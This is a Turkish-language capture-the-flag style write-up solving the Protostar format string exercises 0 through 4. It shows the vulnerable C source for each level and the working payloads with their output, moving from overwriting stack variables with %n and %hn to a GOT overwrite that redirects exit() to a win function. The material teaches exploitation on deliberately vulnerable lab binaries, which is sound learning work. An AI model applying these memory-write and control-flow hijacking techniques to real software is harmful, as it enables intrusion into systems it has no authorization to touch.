---
title:  "Protostar Format Writeup"
date:   2020-12-08T00:48:00-04:00
categories:
  - Binary Exploitation
tags:
  - protostar
  - exploit
---
# Protostar Format Writeup


Merhaba, bu yazıda önceki yazıda çözmüş olduğumuz protostar serisinin `format` bölümünü anlatmaya çalışacağım. Adından da anlaşıldığı üzere bu bölümde format string zafiyetiyle ilgili sorular çözmeye çalışacağız. Öncelikle format string nedir ve printf fonksiyonu nasıl çalışır, fonksiyon çağırıldığında stackde nasıl bir düzen olur bunları bilmemiz lazım. Bu konu için çok güzel bir video var.
* Video: [Link](https://www.youtube.com/watch?v=df5P5DiBLng)
Bu soruları çözmeden önce izlemenizi tavsiye ederim, videoda biraz ses sorunu var ancak yine de izlenebilir seviyede.

Şimdi bu videoyu izlediğinizi varsayarak printf fonksiyonu çağırıldığında stack nasıl bir hal alıyordu bakalım:
![deneme](/assets/images/Stack-of-the-printf-function-call.png)
* Resim kaynağı: [Link](https://www.researchgate.net/publication/237237332_MUTATION-BASED_TESTING_OF_BUFFER_OVERFLOWS_SQL_INJECTIONS_AND_FORMAT_STRING_BUGS)

Burada printf çalışmaya başladığında bufferdan, daha doğrusu verilen textin başından ekrana yazmaya başlıyor. Bu stringin adresi de pointer olarak return adresinin hemen altında bulunuyor. Herhangi bir format spesifier'a geldiğinde ise o format spesifier ne tipte veri okuyacak ise o miktarda veriyi hemen alttan yani format string pointerin altından çekmeye başlıyor. Bu olaylar tabiki normal senaryoda böyle olmakta ancak eğer biz herhangi bir argüman pushlamadan(i  ve str gibi) sadece format spesifier verirsek ne olur? Stackden veri okumaya başlarız ve ileride göreceğimiz üzere veri yazma gibi işlemler de yapacağız. İlk örnek ile başlayalım.
## Format 0
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
Burada main fonksiyonu verdiğimiz argüman ile vuln fonksiyonunu çağırmış ve içeride 64 bytelık buffer ve integer tipinde target tanımlamış. Ardından sprintf ile buffer ve string içeriğini ekrana basıyor. Bizden istediği ise target'ı deadbeef yapmak. Aslında bu aşamanın bufferoverflow sorusundan pek bi farkı yok. Biz buffer'ı doldurduktan sonra kendisinden önce target tanımlandığı için string değişkenine verdiğimiz değer target'ın üzerine yazmış olacak.Deneyelim:
```bash
user@protostar:/opt/protostar/bin$ ./format0 $(python -c 'print "A"*64 + "\xef\xbe\xad\xde"')
you have hit the target correctly :)
```
Evet beklenen şekilde işlem gerçekleşti ve bu aşamayı geçmiş olduk.

## Format 1
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
Burada target'ımız global olarak tanımlanmış. Önceki aşamada yazacağımız hedef bufferın hemen altındaydı ama bu sefer stackde baya aşağılara gideceğiz. Ayrıca hedefe spesific bir değer yazmamız istenmemiş bu yüzden değeri herhangi bir şey ile ezsek yeter. Burada devreye `%n` format spesifierı giriyor. Bu format spesifier kendisine gelinene kadar yazılan verinin uzunluğunu alıp stackden çekilen adrese gidip yazıyor. (bu zaten videoda da anlatılmıştı, izlemediyseniz gidin izleyin :D)
Yani biz stack'e hedef adresi(yani target değişkeninin adresini) yazar ve oraya geldiğimiz noktada verdiğimiz inputta %n koyarsak ne olur? O ana kadar yazılan verinin uzunluğunu stacke yerleştirmiş olduğumuz adrese gidip yazar. E stack'e bu adresi nasıl yazcaz? Verdiğimiz input zaten stacke yazıldığı için argümanın içerisinde yollayacağız. (baya karışık anlattım :/) Mesela:

```bash
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA' + 'BBBB' + '%x '*200"`"
AAAABBBB804960c bffff498 8048469 b7fd8304 b7fd7ff4 bffff498 8048435 bffff681 b7ff1040 804845b b7fd7ff4 8048450 0 bffff518 b7eadc76 2 bffff544 bffff550 b7fe1848 bffff500 ffffffff b7ffeff4 804824d 1 bffff500 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff518 8a739bd5 a022adc5 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff544 8048450 8048440 b7ff1040 bffff53c b7fff8f8 2 bffff677 bffff681 0 bffff8e2 bffff8f7 bffff90e bffff926 bffff934 bffff948 bffff96b bffff982 bffff995 bffff99f bffffe8f bffffea8 bffffee6 bffffefa bfffff18 bfffff2f bfffff40 bfffff5b bfffff63 bfffff73 bfffff80 bfffffb5 bfffffc9 bfffffdd bfffffe9 0 20 b7fe2414 21 b7fe2000 10 78bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff65b 1f bffffff2 f bffff66b 0 0 87000000 6d68a1b7 50553acd baff49aa 695f2ca6 363836 0 2e000000 726f662f 3174616d 41414100 42424241 20782542 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
```
Şimdi ben 4 tane A 4 tane de B ve ardından da 200 tane %x verdiğimde (çıktı okunabilir olsun diye araya space ekledim) A'ları bastıktan sonra %x e gelindiğinde gitti stackden veri çekmeye başladı. dikkat ederseniz içerisinde 41 ve 42 ler var. Bunlar biizm verdiğimiz A ve B lerin hex karşılıkları. Şimdi bu B leri yani 42 leri sona denk getirmeye çalışalım. (Ben deneye deneye yaptım ancak pwntools ile de yapabilirsiniz. pwntools <3)
```bash
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA' + 'BBBB' + '%x '*139"`"
AAAABBBB804960c bffff548 8048469 b7fd8304 b7fd7ff4 bffff548 8048435 bffff738 b7ff1040 804845b b7fd7ff4 8048450 0 bffff5c8 b7eadc76 2 bffff5f4 bffff600 b7fe1848 bffff5b0 ffffffff b7ffeff4 804824d 1 bffff5b0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff5c8 7db457cc 57e681dc 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff5f4 8048450 8048440 b7ff1040 bffff5ec b7fff8f8 2 bffff72e bffff738 0 bffff8e2 bffff8f7 bffff90e bffff926 bffff934 bffff948 bffff96b bffff982 bffff995 bffff99f bffffe8f bffffea8 bffffee6 bffffefa bfffff18 bfffff2f bfffff40 bfffff5b bfffff63 bfffff73 bfffff80 bfffffb5 bfffffc9 bfffffdd bfffffe9 0 20 b7fe2414 21 b7fe2000 10 78bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff70b 1f bffffff2 f bffff71b 0 0 90000000 7bdbc4ae 9759c12f f64b26e9 69511c53 363836 0 0 0 2f2e0000 6d726f66 317461 41414141 42424242
```
Görüldüğü üzere son bölüme 42 leri denk getirdik. Bunların yerine hedef adresimizi yazarsak  ve onun olduğu aşamada da %n eklersek amacımıza ulaşmış oluruz.
```bash
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA' + '\x38\x96\x04\x08' + '%x '*138 + '%n '"`"
AAAA8�804960c bffff548 8048469 b7fd8304 b7fd7ff4 bffff548 8048435 bffff738 b7ff1040 804845b b7fd7ff4 8048450 0 bffff5c8 b7eadc76 2 bffff5f4 bffff600 b7fe1848 bffff5b0 ffffffff b7ffeff4 804824d 1 bffff5b0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff5c8 dc409ca9 f6124ab9 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff5f4 8048450 8048440 b7ff1040 bffff5ec b7fff8f8 2 bffff72e bffff738 0 bffff8e2 bffff8f7 bffff90e bffff926 bffff934 bffff948 bffff96b bffff982 bffff995 bffff99f bffffe8f bffffea8 bffffee6 bffffefa bfffff18 bfffff2f bfffff40 bfffff5b bfffff63 bfffff73 bfffff80 bfffffb5 bfffffc9 bfffffdd bfffffe9 0 20 b7fe2414 21 b7fe2000 10 78bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff70b 1f bffffff2 f bffff71b 0 0 d9000000 1e628f4e 39eb11d5 fe14f7e2 6983c355 363836 0 0 0 2f2e0000 6d726f66 317461 41414141  you have modified the target :)
```
Evet başarı mesajını aldık.
Bu soru için şuradaki çözüm çok daha akıcı ve güzel anlatılmış, izlemenizi tavsiye ederim. [Video için tıkla](https://www.youtube.com/watch?v=Y9HFs3J_9w4)

## Format 2
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
Bu aşamada program çalıştıkta sonra bizden fgets ile bir input alıyor ve bu input ile target değişkenine 64 yazmamızı istiyor. Deneme yapmaya başlayalım:
```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "AAAA" + "%x "*10 ') | ./format2
AAAA200 b7fd8420 bffff524 41414141 25207825 78252078 20782520 25207825 78252078 20782520
target is 0 :(
```
4 tane A verdik ve ardından 10 tane de %x ekledik. Verdiğimiz A'lar dördüncü sırada ekrana basılmış.Peki şimdi target'ın adresini bulalım ve A lar yerine onları ekleyelim.
```bash
user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss	00000004              target
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "\xe4\x96\x04\x08" + "%x "*10 ') | ./format2
��200 b7fd8420 bffff524 80496e4 25207825 78252078 20782520 25207825 78252078 20782520
target is 0 :(
```
Beklediğimiz gibi dördüncü sıraya hedef adresimiz geldi. Şimdi sıra bu adrese veri yazmaya geldi. Adresimizin 4. sırada olduğunu bildiğimize göre `%4$n` ile stackde 4. sıraya gidip veri yazabiliriz.
```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "\xe4\x96\x04\x08" + "%x "*10 +"%4$n" ') | ./format2
��200 b7fd8420 bffff524 80496e4 25207825 78252078 20782520 25207825 78252078 20782520 
target is 88 :(
```
İnputun sonuna eklediğimiz `%4$n` ile veri yazdık ancak hedefimiz olan 64'ü tutturamadık. %n kendine gelene kadar yazılan byte sayısını sayıyordu bunu biliyoruz. Bizim hedef adresimiz 4 byte, geriye 60 byte eklemek kalıyor o zaman. Eklediğimiz %x 'leri silelim ve şöyle deneyelim:
```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "\xe4\x96\x04\x08" + "%60d" +"%4$n" ') | ./format2
��                                                         512
you have modified the target :)
```
Adresimizin hemen ardından %60d ekledik. Bunun ne anlama geldiğini [şuradan](https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_25_printf.html) okuyabilirsiniz. Basitçe (verilen değer - değişkenin uzunluğu) kadar boşluk karakteri ekliyor diyebiliriz. Bu sayede 4 byte adres + 60 byte karakter ile 64 karakter yazdırdık ve sonraki %n ile de bunu hedef adrese yazmış olduk.

## Format 3
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
Bir önceki aşamadan farklı olarak burada bizden beklenen değer değişmiş. Önce nereye nasıl yaıyoruz bakalım.
```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "AAAA" + "%x "*20') | ./format3
AAAA0 bffff4d0 b7fd7ff4 0 0 bffff6d8 804849d bffff4d0 200 b7fd8420 bffff514 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
target is 00000000 :(
```
Yazdığımız A'ları 12'nci sırada gördük. Target değişkeninin adresini bulalım.
```bash
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target
```
Bu adresi A'ların yerine ekleyip üzerine yazmaya çalışalım.
```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "\xf4\x96\x04\x08" + "%12$n"') | ./format3
��
target is 00000004 :(
```
Eklediğim %x leri kaldırıp sadece adresi bıraktığımda (ki bu adresin uzunluğu 4 byte) hedefe 4 yazmış oluyorum. Benim hedefim ise `0x01025544` yazmak. Geriye `0x01025544 - 0x04 = 0x1025540 = 16930112` byte yazmam lazım.
```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "\xf4\x96\x04\x08" + "%16930112d"+"%12$n"') | ./format3
...
...
...
buralarda yüzlerce boşluk karakteri olacak verdiğimiz sayıdan dolayı
...
...
you have modified the target :)
```
Ve bu şekilde bu aşamayı da çzödük ancak bu aşamayı 1 ve 2 byte yazma yöntemleri ile de çözebilrdik. Onun için de şuralara bakabilirsiniz [Link1]() [Link2]()

## Format 4
Kaynak kod:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```
Bu aşamada işler iyice karışıyor ve bizden program akışını değiştirip vuln fonksiyonunaki zafiyetten faydalanarak hello fonksiyonuna atlayıp başarı mesajını ekrana yazdırmak. Peki bunu yapmak için nasıl bir yol izleyeceğiz? Return adresini ezme gibi bri durumumuz yok çünkü vuln fonksiyonu geri dönmeden exit ile çıkış yapıyor. Eğer biz exit fonksiyonunun adresini hello fonksiyonunun adresi ile değiştirebilirsek program exit fonksiyonunu çalıştırmak istesiğinde gidip bizim hello fonksiyonuna zıplar ve onu çalıştırır. Exit fonksiyonunun adresini değiştrimek için anlamamız gereken bir konu var, o da PLT(process linkage table) ve GOT(global offset table) tabloları. Bunlar ne olaki diye soruyorsanız burada ayrıntılı bir şekilde anlatmayacağım ancak şu iki kaynaktan güzel bir şekilde öğrenebilirsiniz. [Video](https://www.youtube.com/watch?v=kUk5pw4w0h4) ve [Blog](https://programmersought.com/article/20004546156/) <br> Bunları izlediğinizi/okuduğunuzu varsayarak devam ediyorum, şu fonksiyonların adreslerini gdb ile bulalım.
```bash
hello nun adresini bulma
------------------------
(gdb) x hello
0x80484b4 <hello>:	0x83e58955
```
Hellonun adresini bulduk, burada sıra exit fonksiyonuna geldi.
```bash
(gdb) disas vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:	push   %ebp
0x080484d3 <vuln+1>:	mov    %esp,%ebp
0x080484d5 <vuln+3>:	sub    $0x218,%esp
0x080484db <vuln+9>:	mov    0x8049730,%eax
0x080484e0 <vuln+14>:	mov    %eax,0x8(%esp)
0x080484e4 <vuln+18>:	movl   $0x200,0x4(%esp)
0x080484ec <vuln+26>:	lea    -0x208(%ebp),%eax
0x080484f2 <vuln+32>:	mov    %eax,(%esp)
0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:	lea    -0x208(%ebp),%eax
0x08048500 <vuln+46>:	mov    %eax,(%esp)
0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:	movl   $0x1,(%esp)
0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
End of assembler dump.
(gdb) disas 0x80483ec
Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:	jmp    *0x8049724
0x080483f2 <exit@plt+6>:	push   $0x30
0x080483f7 <exit@plt+11>:	jmp    0x804837c
End of assembler dump.
```
Vuln fonksiyonunun içeriğine bakıp son satırdaki exit fonksiyonuna bakalım. Dikkat ederseniz buradaki adres PLT tablosundan bir adres. Bahsettiğim kaynaklarda da görmüşsünüzdür ki PLT tablosu entrylerden oluşuyor. Yani ilk iki satırdan sonrası 3'er satır şeklinde entrylerden oluşuyor. Burada biz exit fonksiyonunu çağırırken plt'deki ilgili entrye gidip ilk satırından ilgili GOT table satırına jmp ile zıplıyor. Oradan da fonksiyonun libc'deki adres değerini alıp ona jmp ile zıplıyor. Burada kafanız karışmış olabilir. PLT ve GOT table yapısını başka bir yazıda anlatmayı düşünüyorum adım adım.<br><br>
Şimdi biz burada  `0x8049724` adresinin içeriğini değiştirmeye çalışacağız çünkü GOT tablosunda bu adreste exit fonksiyonunun adresi var. Yani `0x8049724` adresinin olduğu noktaya hellonun adresini yazmalıyız ki plt tablosunda ilgili entrynin ilk satırına geldiğinde içeriğini çalıştıracağı got table adresinde hello olsun. (Baya karışık anlattım :/ ) <br><br>
Biz bu adrese `0x80484b4 = 134513844` yazacağız ancak sayı çook büyük. Bunu yapmak için format stringlerdeki bri özellikten faydalanacağız. %n yerine %hn vererek 4 byte yerine 2 byte yazabilme gibi bir lüksümüz var :) Hedef adresin düşük anlamlı 2 byte'ına yazmak için 0x8049724 adresinden, diğer 2 byteına yazmak için de 0x8049726 adresinden başlamamız gerekir.
```bash
user@protostar:/tmp$ echo $(python -c 'print "\x26\x97\x04\x08" + "\x24\x97\x04\x08" + "%x "*10 ') | /opt/protostar/bin/format4
$�&�200 b7fd8420 bffff4f4 8049726 8049724 25207825 78252078 20782520 25207825 78252078
```
4 . sıraya ilk adresi ve 5. sıraya da ikinci adresi yazıyormuşuz.
```bash
user@protostar:/tmp$ echo $(python -c 'print "\x26\x97\x04\x08" + "\x24\x97\x04\x08" + "%2044d" + "%4$hn" + "%d" + "%5$hn" ') | /opt/protostar/bin/format4

user@protostar:/tmp$ dmesg | tail -1
[11906.772182] format4[1887]: segfault at 804080f ip 0804080f sp bffff49c error 4 in format4[8048000+1000]
```
Denemeler sonucu ilk parçayı tamamladık. burada deneme yanılma yolu ile ilerledim ancak isterseniz gdb ile bakıp hesaplayıp yapabilirsiniz. diğer tarafı da tamamlayalım.

```bash
user@protostar:/tmp$ echo $(python -c 'print "\x26\x97\x04\x08" + "\x24\x97\x04\x08" + "%2044d" + "%4$hn" + "%31919d" + "%5$hn" ') | /opt/protostar/bin/format4
.
.
 -1208122336
code execution redirected! you win
```
Ve diğer adresi de denk getirdik. Bu şekilde format serisini de tamamlamış olduk.

Faydalı Linkler :
1. https://www.tutorialspoint.com/format-specifiers-in-c
2. https://stackoverflow.com/questions/38942594/difference-between-single-and-double-quotes-in-printf-in-c
3. https://www.researchgate.net/figure/Stack-of-the-printf-function-call_fig2_237237332
